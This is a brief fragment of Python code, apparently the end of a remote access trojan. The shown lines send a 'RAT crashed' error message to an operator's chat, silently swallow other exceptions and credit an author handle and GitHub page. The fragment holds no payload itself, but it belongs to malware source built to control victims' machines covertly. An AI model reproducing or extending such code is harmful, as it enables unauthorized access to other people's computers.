                    data={"chat_id": admin_id, "text": f"❌ RAT crashed: {str(e)}"}
                )
        except:
            pass
        #create by:h3Dr1per
        #github:https://github.com/paradoks182